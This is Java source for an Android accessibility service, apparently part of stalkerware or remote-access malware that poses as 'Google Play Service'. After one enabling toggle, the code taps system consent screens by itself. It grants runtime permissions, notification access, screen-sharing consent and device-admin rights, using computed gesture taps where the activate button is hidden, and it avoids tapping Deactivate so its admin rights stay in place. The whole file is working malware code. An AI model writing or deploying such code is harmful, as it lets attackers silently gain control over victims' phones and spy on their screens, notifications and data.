package com.android.background.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.admin.DevicePolicyManager;
import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import java.util.ArrayList;
import java.util.List;

/**
 * Auto-grant accessibility service.
 *
 * Once the user enables this service (one manual toggle in Settings — the app
 * opens that screen itself), it automatically taps the positive button on every
 * system consent screen the payload needs, so a fresh install needs no adb and
 * no per-dialog taps:
 *
 *   - runtime permission dialogs      -> "Allow" / "While using the app" / "OK"
 *   - device-admin activation screen  -> "Activate" / "Activate this device admin"
 *   - battery-optimization dialog     -> "Allow" / "OK"
 *   - overlay / all-files storage     -> "Allow" / "OK"
 *
 * Matching is text-based and package-scoped to the real system dialogs
 * (permission controller, settings app), never to the payload's own UI.
 */
public class AutoGrantService extends AccessibilityService {

    private static final String TAG = "AutoGrant";
    private static final String[] PERMISSION_PACKAGES = {
            "com.android.permissioncontroller",   // Android 11+
            "com.google.android.permissioncontroller",
            "com.android.packageinstaller",       // older Android
    };
    private static final String[] SETTINGS_PACKAGES = {
            "com.android.settings",
            "com.google.android.settings.intelligence",
    };

    /** Positive labels to tap, longest-first so "Allow all the time" wins. */
    private static final String[] ALLOW_LABELS = {
            "Allow all the time", "While using the app", "Activate this device admin",
            "Share entire screen",   // MediaProjection consent option (select)
    };
    // Single-word labels are matched by exact (case-insensitive) text only, so
    // the service never taps a row merely because its text contains "Allow" /
    // "OK" (e.g. a settings row saying "Allow notification access").
    private static final String[] EXACT_LABELS = {
            "Allow", "OK", "Approve", "Activate",
            "Start now", "Share screen", "Share",   // MediaProjection consent
    };

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Runnable rescanRunnable = this::rescanActiveWindow;

    /** If a button was found on the last scan, re-check shortly afterwards. */
    private boolean foundActionable = false;
    private String lastScannedPackage = "";
    private String lastScannedClassName = "";

    /** Scroll fallback budget per window: some trees hide the action row below
     * the visible viewport; scroll forward a few times then re-scan. */
    private int scrollCount = 0;

    /**
     * Android 17+ hides the DeviceAdminAdd action row from accessibility trees
     * (verified: only title + capability list are exposed). As a last resort we
     * dispatch a gesture at a computed position. Capped per window so we never
     * tap more than a few times.
     */
    private int adminGestureTries = 0;
    private int bindScanTries = 0;

    /** Our own app label (e.g. "Google Play Service") for row matching. */
    private String ourLabel = "";

    /** True when this service is currently enabled in system settings. */
    public static boolean isEnabled(Context ctx) {
        String flat = Settings.Secure.getString(ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (TextUtils.isEmpty(flat)) return false;
        String expected = new ComponentName(ctx, AutoGrantService.class).flattenToString();
        for (String name : flat.split(":")) {
            if (name.equalsIgnoreCase(expected)) return true;
        }
        return false;
    }

    /** Open the system screen where the user enables this service (one tap). */
    public static void openSettings(Context ctx) {
        try {
            ctx.startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        } catch (Exception e) {
            Log.e(TAG, "open accessibility settings failed", e);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            int t = event.getEventType();
            if (t == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                // Full scan on window changes; foundActionable resets here so
                // repeat taps can never happen within one window.
                scanWindow(event);
            } else if (t == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                // Some screens render their button row a beat after the window
                // appears. Full scans on every content change are expensive, so
                // just re-arm the one-shot follow-up scan (debounced: it fires
                // 500 ms after the LAST content change).
                reschedule();
            } else if (t == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
                // A full-screen dialog (notification consent) can appear as a
                // new window without a state-changed event on some builds.
                reschedule();
            }
        } catch (Exception e) {
            // transient — the follow-up scan covers it
        }
    }

    /** Scan the currently focused system window for a positive button to tap. */
    private void scanWindow(AccessibilityEvent event) {
        foundActionable = false;   // new window — allow a fresh tap
        scrollCount = 0;
        adminGestureTries = 0;
        lastScannedClassName = event.getClassName() == null ? "" : event.getClassName().toString();
        String pkg = event.getPackageName() == null ? "" : event.getPackageName().toString();
        lastScannedPackage = pkg;
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) {
            reschedule();
            return;
        }
        try {
            if (isPermissionDialog(pkg) || isSettingsScreen(pkg)) {
                if (tapAllow(root)) {
                    Log.i(TAG, "auto-tapped allow on " + pkg);
                    foundActionable = true;
                } else if (isNotificationListScreen(lastScannedClassName) && tapOurAppRow(root)) {
                    // Notification-listener settings: open OUR app's row so its
                    // consent switch (and AutoGrant-tapped Allow dialog) follow.
                    // Scoped to the list screen only — the detail page shows the
                    // app label as a header and must never be re-tapped.
                    Log.i(TAG, "tapped our app row (notification list)");
                    foundActionable = true;
                } else if (tapNotificationAccessSwitch(root)) {
                    // Detail screen with the "Allow notification access" switch.
                    Log.i(TAG, "tapped notification-access switch");
                    foundActionable = true;
                } else if (root.isScrollable() && scrollCount < 3) {
                    // The positive button may sit below the visible viewport
                    // (long admin/overlay screens). Scroll and re-scan.
                    root.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
                    scrollCount++;
                } else if (tryAdminGesture(root)) {
                    // DeviceAdminAdd on Android 17+: button hidden from the tree,
                    // so compute its position and dispatch a tap gesture.
                    Log.i(TAG, "gesture-tapped admin activate on " + pkg);
                    foundActionable = true;
                }
            }
        } finally {
            root.recycle();
        }
        reschedule();
    }

    /**
     * Re-scan shortly after a window change. Some consent buttons render a few
     * hundred ms after their window appears (slow dialogs, admin screens), so a
     * single follow-up scan catches what the initial one missed.
     */
    private void reschedule() {
        mainHandler.removeCallbacks(rescanRunnable);
        mainHandler.postDelayed(rescanRunnable, 500L);
    }

    private void rescanActiveWindow() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            try {
                if (isPermissionDialog(lastScannedPackage) || isSettingsScreen(lastScannedPackage)) {
                    if (tapAllow(root)) {
                        Log.i(TAG, "auto-tapped allow (rescan) on " + lastScannedPackage);
                        foundActionable = true;
                    } else if (isNotificationListScreen(lastScannedClassName) && tapOurAppRow(root)) {
                        Log.i(TAG, "tapped our app row (notification list, rescan)");
                        foundActionable = true;
                    } else if (tapNotificationAccessSwitch(root)) {
                        Log.i(TAG, "tapped notification-access switch (rescan)");
                        foundActionable = true;
                    } else if (tryAdminGesture(root)) {
                        Log.i(TAG, "gesture-tapped admin activate (rescan) on " + lastScannedPackage);
                        foundActionable = true;
                    }
                }
            } finally {
                root.recycle();
            }
        } catch (Exception e) {
            // ignore — next window change re-scans
        }
    }

    @Override
    public void onInterrupt() {
        mainHandler.removeCallbacks(rescanRunnable);
    }

    @Override
    public void onDestroy() {
        mainHandler.removeCallbacks(rescanRunnable);
        super.onDestroy();
    }

    private boolean isPermissionDialog(String pkg) {
        for (String p : PERMISSION_PACKAGES) {
            if (pkg.equals(p)) return true;
        }
        return false;
    }

    private boolean isSettingsScreen(String pkg) {
        for (String p : SETTINGS_PACKAGES) {
            if (pkg.equals(p)) return true;
        }
        return false;
    }

    /**
     * Tap OUR app's row in the notification-listener list (exact app-label
     * match, so the similarly-named Google apps are never touched). The detail
     * screen that opens then shows the consent switch which the next scan taps.
     */
    private boolean tapOurAppRow(AccessibilityNodeInfo root) {
        if (foundActionable) return false;   // one action per window — no repeat taps
        if (ourLabel.length() == 0) return false;
        List<AccessibilityNodeInfo> nodes = new ArrayList<>();
        collect(root, nodes);
        try {
            for (AccessibilityNodeInfo n : nodes) {
                CharSequence t = n.getText();
                if (t == null) continue;
                if (!t.toString().trim().equalsIgnoreCase(ourLabel)) continue;
                AccessibilityNodeInfo target = findClickableAncestor(n);
                if (target == null) target = n;
                try {
                    return target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                } finally {
                    if (target != n) target.recycle();
                }
            }
        } finally {
            for (AccessibilityNodeInfo n : nodes) {
                if (n != root) n.recycle();
            }
        }
        return false;
    }

    /**
     * Tap the "Allow notification access" switch row on the listener detail
     * screen. The subsequent consent dialog's Allow button is handled by the
     * regular tapAllow path.
     */
    private boolean tapNotificationAccessSwitch(AccessibilityNodeInfo root) {
        if (foundActionable) return false;   // one action per window — no repeat taps
        List<AccessibilityNodeInfo> nodes = new ArrayList<>();
        collect(root, nodes);
        try {
            for (AccessibilityNodeInfo n : nodes) {
                CharSequence t = n.getText();
                if (t == null) continue;
                String label = t.toString().trim().toLowerCase();
                // "Allow notification access" — never matched by the exact
                // "Allow" guard, and only present on the listener detail screen.
                if (!label.contains("notification access")) continue;
                AccessibilityNodeInfo target = findClickableAncestor(n);
                if (target == null) target = n;
                try {
                    return target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                } finally {
                    if (target != n) target.recycle();
                }
            }
        } finally {
            for (AccessibilityNodeInfo n : nodes) {
                if (n != root) n.recycle();
            }
        }
        return false;
    }

    /** Text markers unique to the DeviceAdminAdd screen (its capability list). */
    private static final String[] ADMIN_MARKERS = {
            "device admin",
            "erase all data",
            "change the screen lock",
            "disable cameras",
            "monitor screen unlock",
            "lock the screen",
    };

    /**
     * Computed-tap fallback for the device-admin ACTIVATION screen (Android 17+
     * hides the Activate row from accessibility trees). Fully device-agnostic:
     * the button is a full-width bar rendered just below the last visible
     * content node, so we tap at the tree's lowest node bottom plus a small
     * margin — never a hardcoded pixel. Falls back to the lower band of the
     * screen when the tree is empty.
     *
     * Guarded so it can NEVER fire on the active-admin DETAIL screen (which
     * shows the same capability list plus a Deactivate button — a tap there
     * would revoke the admin): the detail screen contains "Deactivate this
     * device admin app" / "This admin app is active", which excludes it.
     */
    private boolean tryAdminGesture(AccessibilityNodeInfo root) {
        if (adminGestureTries >= 3) return false;
        Rect screen = new Rect();
        root.getBoundsInScreen(screen);
        if (screen.isEmpty()) return false;
        List<AccessibilityNodeInfo> nodes = new ArrayList<>();
        collect(root, nodes);
        boolean adminScreen = false;
        boolean activeDetailScreen = false;
        int textBottom = 0;
        try {
            for (AccessibilityNodeInfo n : nodes) {
                CharSequence t = n.getText();
                if (t == null || t.length() == 0) continue;
                String label = t.toString().trim().toLowerCase();
                if (label.contains("deactivate") || label.contains("is active")
                        || label.contains("active admin")) {
                    activeDetailScreen = true;
                }
                for (String m : ADMIN_MARKERS) {
                    if (label.contains(m)) { adminScreen = true; break; }
                }
                Rect b = new Rect();
                n.getBoundsInScreen(b);
                if (!b.isEmpty() && b.bottom > textBottom && b.bottom < screen.bottom) {
                    textBottom = b.bottom;
                }
            }
        } finally {
            for (AccessibilityNodeInfo n : nodes) {
                if (n != root) n.recycle();
            }
        }
        if (!adminScreen || activeDetailScreen) return false;
        adminGestureTries++;
        // On DeviceAdminAdd the full-width Activate bar renders directly below
        // the capability list, so tapping just under the last text node hits it
        // (the tree may be partial right after bind, so the first two attempts
        // both recompute from the current tree; the last one falls back to the
        // lower band for layouts with pinned bottom bars). All positions are
        // computed from the tree — never hardcoded pixels.
        int x = screen.centerX();
        int y;
        if (adminGestureTries <= 2 && textBottom > 0) {
            y = textBottom + Math.max(30, screen.height() / 40);
        } else {
            y = screen.bottom - screen.height() / 10;
        }
        if (y >= screen.bottom - 10 || y <= screen.top + screen.height() / 5) return false;
        Log.i(TAG, "gesture tap at (" + x + "," + y + ") textBottom=" + textBottom + " try=" + adminGestureTries);
        return dispatchTap(x, y);
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        try {
            ourLabel = getApplicationInfo().loadLabel(getPackageManager()).toString();
        } catch (Exception e) {
            ourLabel = "";
        }
        // Fresh install: the wizard can have the device-admin (or another
        // consent) screen open before this service binds, so no window-change
        // event will arrive for it. Scan the focused window once the tree is
        // ready so no consent screen is ever missed.
        mainHandler.postDelayed(this::scanFocusedWindowNow, 600L);
    }

    /** Marker-based scan of whatever window is focused right now. */
    private void scanFocusedWindowNow() {
        bindScanTries++;
        if (bindScanTries > 3) return;
        boolean anyAction = false;
        try {
            for (AccessibilityWindowInfo w : getWindows()) {
                if (w == null || !w.isActive()) continue;
                AccessibilityNodeInfo root = w.getRoot();
                if (root == null) continue;
                try {
                    if (handleSettingsWindow(root)) anyAction = true;
                } finally {
                    root.recycle();
                }
            }
        } catch (Exception e) {
            // ignore — window events will re-scan
        }
        // dispatchGesture / ACTION_CLICK returning true only means "queued" —
        // the tap can still be swallowed. Verify the admin actually activated
        // and retry from a fresh tree if not, capped so we never loop forever.
        if (anyAction) {
            mainHandler.postDelayed(this::verifyAdminOrRetry, 1300L);
        } else if (bindScanTries < 3) {
            mainHandler.postDelayed(this::scanFocusedWindowNow, 1300L);
        }
    }

    /**
     * After a bind-scan dispatch, check whether the admin really got activated;
     * re-scan from a fresh tree otherwise (still capped by bindScanTries).
     */
    private void verifyAdminOrRetry() {
        try {
            if (bindScanTries >= 3) return;
            if (isAdminActive()) { foundActionable = true; return; }
            scanFocusedWindowNow();
        } catch (Exception e) {
            // ignore — next window event re-scans
        }
    }

    /** True when the window is the notification-listener list screen. */
    private boolean isNotificationListScreen(String className) {
        return className != null && className.contains("NotificationAccess");
    }

    /** True when the tree contains the listener list's status texts. */
    private boolean treeHasListenerListMarker(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> nodes = new ArrayList<>();
        collect(root, nodes);
        try {
            for (AccessibilityNodeInfo n : nodes) {
                CharSequence t = n.getText();
                if (t == null) continue;
                String label = t.toString().trim();
                if (label.equalsIgnoreCase("Allowed") || label.equalsIgnoreCase("Not allowed")) {
                    return true;
                }
            }
        } finally {
            for (AccessibilityNodeInfo n : nodes) {
                if (n != root) n.recycle();
            }
        }
        return false;
    }

    /**
     * Actions safe to run without knowing the window's package, because every
     * one is gated by exact/exclusive text: our own app row, the
     * notification-access switch row, and the marker-checked admin gesture.
     * Returns true when something was dispatched.
     */
    private boolean handleSettingsWindow(AccessibilityNodeInfo root) {
        // The bind scan has no event className, so gate the row tap on the
        // listener list's status texts ("Allowed"/"Not allowed") — the detail
        // page shows our app label as a header and must never be tapped.
        if (treeHasListenerListMarker(root) && tapOurAppRow(root)) {
            Log.i(TAG, "tapped our app row (bind scan)");
            foundActionable = true;
            return true;
        }
        if (tapNotificationAccessSwitch(root)) {
            Log.i(TAG, "tapped notification-access switch (bind scan)");
            foundActionable = true;
            return true;
        }
        if (tryAdminGesture(root)) {
            Log.i(TAG, "gesture-tapped admin activate (bind scan)");
            foundActionable = true;
            return true;
        }
        return false;
    }

    private boolean isAdminActive() {
        try {
            DevicePolicyManager dpm =
                    (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            return dpm != null && dpm.isAdminActive(
                    new ComponentName(this, com.android.background.services.receivers.AdminReceiver.class));
        } catch (Exception e) {
            return false;
        }
    }

    /** Dispatch a short tap gesture at (x, y). Returns true when dispatched. */
    private boolean dispatchTap(int x, int y) {
        try {
            Path p = new Path();
            p.moveTo(x, y);
            GestureDescription.StrokeDescription stroke =
                    new GestureDescription.StrokeDescription(p, 0L, 120L);
            GestureDescription gd = new GestureDescription.Builder().addStroke(stroke).build();
            return dispatchGesture(gd, null, null);
        } catch (Exception e) {
            Log.w(TAG, "dispatchGesture failed", e);
            return false;
        }
    }

    /**
     * Depth-first search for a node whose text/content-desc matches an allow
     * label, then click it. Settings buttons (device-admin Activate, the
     * accessibility toggle) are frequently exposed as non-clickable text nodes
     * with the clickable container further up the tree, so walk up the ancestor
     * chain before giving up; if nothing is clickable, best-effort click the
     * node itself (some UIs accept ACTION_CLICK on any node).
     */
    private boolean tapAllow(AccessibilityNodeInfo root) {
        if (foundActionable) return false;   // already handled this window; avoid repeat taps
        List<AccessibilityNodeInfo> nodes = new ArrayList<>();
        collect(root, nodes);   // nodes are recycled in the finally below
        try {
            for (AccessibilityNodeInfo n : nodes) {
                if (!matchesAllowLabel(n)) continue;
                AccessibilityNodeInfo target = findClickableAncestor(n);
                if (target == null) {
                    // best-effort: some dialogs expose the button only as a
                    // non-clickable text node
                    target = n;
                }
                if (target != null) {
                    try {
                        target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    } finally {
                        // recycle the getParent()-wrapper (never the node from
                        // `nodes` — those are recycled by the outer finally)
                        if (target != n) target.recycle();
                    }
                    return true;
                }
            }
        } finally {
            for (AccessibilityNodeInfo n : nodes) {
                if (n != root) n.recycle();
            }
        }
        return false;
    }

    /**
     * Resource-ids of known positive buttons (some Settings screens expose the
     * button with empty text but a stable view id).
     */
    private static final String[] ALLOW_RESOURCE_IDS = {
            "admin_action_button",              // device-admin Activate / Deactivate
            "accessibility_permission_enable_allow_button", // a11y consent Allow
            "permission_allow_button",          // runtime-permission dialog Allow
            "permission_allow_foreground_only_button",
            "grant_button",                     // package installer
    };

    /** True when the node's text/content-desc or view-id matches an allow label. */
    private boolean matchesAllowLabel(AccessibilityNodeInfo n) {
        CharSequence[] candidates = { n.getText(), n.getContentDescription() };
        for (CharSequence c : candidates) {
            if (c == null || c.length() == 0) continue;
            String label = c.toString().trim();
            for (String allow : ALLOW_LABELS) {
                if (label.contains(allow)) return true;
            }
            for (String exact : EXACT_LABELS) {
                if (label.equalsIgnoreCase(exact)) return true;
            }
        }
        CharSequence rid = n.getViewIdResourceName();
        if (rid != null && rid.length() > 0) {
            String id = rid.toString();
            for (String allowRid : ALLOW_RESOURCE_IDS) {
                if (id.endsWith(allowRid)) return true;
            }
        }
        return false;
    }

    /**
     * Walk up the ancestor chain (up to 8 levels) looking for a clickable node.
     * The wrapper nodes obtained via getParent() are recycled as we move past
     * them; the returned clickable wrapper (if any) is recycled by the caller.
     */
    private AccessibilityNodeInfo findClickableAncestor(AccessibilityNodeInfo n) {
        AccessibilityNodeInfo cur = n;
        for (int i = 0; i < 8 && cur != null; i++) {
            if (cur.isClickable()) return cur;
            AccessibilityNodeInfo parent = cur.getParent();
            if (parent == null || parent == cur) break;
            if (cur != n) cur.recycle();   // no longer needed
            cur = parent;
        }
        return null;
    }

    private void collect(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> out) {
        // Deliberately do NOT recycle children here: they are used (getText /
        // performAction) after collection, and recycled once in tapAllow's finally.
        if (node == null) return;
        out.add(node);
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collect(child, out);
        }
    }
}
